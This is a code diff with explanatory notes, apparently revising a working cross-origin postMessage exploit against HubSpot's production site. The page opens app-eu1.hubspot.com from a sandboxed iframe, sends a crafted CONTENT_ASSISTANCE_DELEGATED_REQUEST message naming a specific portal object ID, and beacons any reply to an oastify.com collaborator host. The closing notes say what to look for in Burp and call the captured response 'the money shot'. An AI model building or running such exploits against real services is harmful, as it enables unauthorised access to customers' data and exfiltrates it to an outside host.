@@ -22,28 +22,51 @@ window.addEventListener('message', function(e) {
     if (e.data && e.data.action === 'startExploit') {
         log('EXPLOIT_TRIGGERED');
         
-        // Using srcdoc instead of data URI
         const iframe = document.createElement('iframe');
         iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
-        iframe.srcdoc = `
-<h2>Sandbox Active</h2>
-<div id="log" style="font-family:monospace;font-size:12px;background:#000;color:#0f0;padding:10px;"></div>
+        iframe.src = 'about:blank';
+        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
+        
+        iframe.onload = function() {
+            log('SANDBOX_LOADED');
+            
+            const doc = iframe.contentWindow.document;
+            doc.open();
+            doc.write(`
+<!DOCTYPE html>
+<html>
+<head><title>Sandbox</title></head>
+<body>
+<h2>Sandbox</h2>
+<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:350px;overflow:auto;"></div>
 <script>
 const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
 
 function log(msg) {
-    document.getElementById('log').innerHTML += '<br>' + msg;
+    const d = document.getElementById('log');
+    d.innerHTML += '<br>' + msg;
+    d.scrollTop = d.scrollHeight;
     new Image().src = EXFIL + '/?s=' + encodeURIComponent(msg);
 }
 
 log('sandbox_running');
 log('origin=' + window.origin);
 
+// Listen for ANY message to see if HubSpot responds
+window.addEventListener('message', function(resp) {
+    log('!!! GOT_RESPONSE !!!');
+    log('from=' + resp.origin);
+    log('type=' + (resp.data.type || 'unknown'));
+    log('data=' + JSON.stringify(resp.data).substring(0, 100));
+    new Image().src = EXFIL + '/?RESPONSE=' + encodeURIComponent(JSON.stringify(resp.data).substring(0, 500));
+});
+
 try {
-    let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=800,height=600');
+    log('opening_hubspot');
+    let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');
     
     if (!hub) {
-        log('popup_blocked');
+        log('ERROR_popup_blocked');
     } else {
         log('popup_opened');
         
@@ -52,41 +75,34 @@ try {
             attempts++;
             
             try {
-                let test = hub.origin;
-                if (attempts % 10 === 0) log('polling_' + attempts);
+                hub.origin; // Will throw when cross-origin
+                if (attempts % 10 === 0) log('waiting_' + attempts);
             } catch(e) {
                 clearInterval(checker);
-                log('hubspot_loaded_after_' + attempts);
+                log('hubspot_loaded_' + attempts);
                 
-                window.addEventListener('message', function(resp) {
-                    log('RESPONSE_from=' + resp.origin);
-                    new Image().src = EXFIL + '/?response=' + encodeURIComponent(JSON.stringify(resp.data).substring(0, 300));
-                });
-                
+                // Wait a bit for HubSpot to fully initialize
                 setTimeout(() => {
-                    log('sending_exploit_1');
+                    log('SENDING_EXPLOIT_NOW');
+                    
+                    // Send the exact format HubSpot expects
                     hub.postMessage({
                         type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                         commandId: 'exploit123',
-                        featureId: 'test',
+                        featureId: 'email_editor',
                         parameters: {},
                         resultCount: 1,
                         language: 'en',
                         objectId: '46962361',
-                        applicationId: 'crm',
+                        applicationId: 'email',
                         basePath: '/',
-                        maxPollingAttempts: 1,
-                        pollingInterval: 100
+                        maxPollingAttempts: 5,
+                        pollingInterval: 1000
                     }, '*');
-                }, 1000);
-                
-                setTimeout(() => {
-                    log('sending_exploit_2');
-                    hub.postMessage({
-                        type: 'raw',
-                        _callbackId: 'x',
-                        body: {action: 'getData', portalId: '46962361'}
-                    }, '*');
+                    
+                    log('message_sent_to_hubspot');
+                    log('waiting_for_response...');
+                    
                 }, 2000);
             }
             
@@ -99,9 +115,12 @@ try {
 } catch(err) {
     log('ERROR=' + err.message);
 }
-</` + `script>
-        `;
-        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
+<\\/script>
+</body>
+</html>
+            `);
+            doc.close();
+        };
         
         document.body.appendChild(iframe);
         log('SANDBOX_ADDED');
@@ -117,3 +136,28 @@ if(window.opener){
 </script>
 </body>
 </html>
+```
+
+---
+
+## **What This Does:**
+
+1. **Listens for ANY response** from HubSpot
+2. **Sends exactly one CONTENT_ASSISTANCE_DELEGATED_REQUEST** message
+3. **Waits 2 seconds** after HubSpot loads to ensure all listeners are registered
+4. **Logs everything** to both screen and Burp
+
+---
+
+## **What to Look For:**
+
+Check Burp for:
+```
+/?s=origin=null              ← Should be null with about:blank
+/?s=popup_opened
+/?s=hubspot_loaded_XX
+/?s=SENDING_EXPLOIT_NOW
+/?s=message_sent_to_hubspot
+/?s=waiting_for_response...
+/?s=!!!_GOT_RESPONSE_!!!     ← THE MONEY SHOT!
+/?RESPONSE=...               ← The actual response data
